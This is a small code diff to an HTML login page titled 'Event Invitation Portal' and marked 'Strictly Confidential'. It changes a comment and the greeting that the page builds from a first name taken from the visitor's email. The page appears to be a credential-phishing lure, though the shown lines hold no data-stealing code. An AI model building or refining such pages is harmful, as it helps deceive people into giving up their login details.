@@ -141,7 +141,7 @@
   <div id="login" class="login-container">
     <img src="https://i.postimg.cc/qMNXQ08h/user-male-circle-blue-512.webp">
 
-    <!-- ✅ Dynamic Title -->
+    <!-- ✅ Updated Title -->
     <h2 id="portalTitle">Event Invitation Portal</h2>
 
     <p class="subtext">Strictly Confidential</p>
@@ -189,7 +189,7 @@
       const firstName = extractFirstName(email);
 
       if (firstName) {
-        title.textContent = firstName + ", sign-in to continue";
+        title.textContent = "Hi, " + firstName;
       } else {
         title.textContent = "Event Invitation Portal";
       }
